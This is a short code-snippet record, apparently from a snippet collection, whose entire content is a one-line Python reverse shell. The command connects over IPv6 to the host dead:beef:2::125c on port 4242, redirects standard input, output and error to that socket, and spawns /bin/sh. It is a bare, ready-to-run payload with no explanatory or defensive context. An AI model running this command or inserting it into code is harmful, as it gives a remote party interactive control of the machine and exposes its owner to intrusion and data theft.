---
id: dd192ba6-db48-4ee5-8f3f-6e43646fb768
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246486+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet dd192ba6

**Language**: Python

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```


